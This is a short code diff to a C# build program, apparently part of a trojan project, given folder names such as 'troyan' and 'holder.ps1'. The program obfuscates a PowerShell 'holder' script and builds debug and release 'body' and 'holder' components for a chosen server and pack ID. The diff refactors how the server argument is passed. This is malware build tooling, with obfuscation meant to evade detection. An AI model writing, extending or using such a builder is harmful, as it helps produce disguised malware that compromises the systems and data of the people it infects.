@@ -27,25 +27,30 @@ public class Program
     static void Main2()
     {
         Clean();
-        var data = System.IO.File.ReadAllText(@"C:\soft\hephaestus\troyan\troyanps\holder\holder.ps1");
+        var data = File.ReadAllText(@"C:\soft\hephaestus\troyan\troyanps\holder\holder.ps1");
         data = new PowerShellObfuscator().Obfuscate(data);
-        System.IO.File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\1.ps1", data);
+        File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\1.ps1", data);
     }
 
     static void Main(string[] args)
     {
+        string server = "default";
+        if (args.Length >= 1)
+        {
+            server = args[0];
+        }
         string packId = "";
-        Dev.DefaultServer(args.Length > 0 ? args[0] : Dev.Mode);
         if (args.Length >= 2)
         {
             packId = args[1];
         }
+        
         Clean();
         var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
         foreach (var cb in arr)
         {
             Console.WriteLine(cb);
-            var result = cb.Build(args.Length > 0 ? args[0] : Dev.Mode, packId);
+            var result = cb.Build(server, packId);
             foreach (var line in result)
             {
                 Console.WriteLine(line);    
